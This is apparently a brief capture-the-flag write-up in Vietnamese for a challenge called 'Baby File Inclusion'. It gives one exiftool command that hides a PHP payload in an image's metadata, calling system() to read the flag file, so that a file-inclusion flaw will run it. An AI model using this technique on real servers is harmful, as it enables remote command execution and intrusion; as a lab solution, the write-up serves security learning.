## Baby File Inclusion

Bài này sử dụng exiftool để chèn shell vào ảnh

`exiftool -Comment="<?php system('cat /flag*'); ?>" image.png -o shell.png"`

![Alt text](image.png)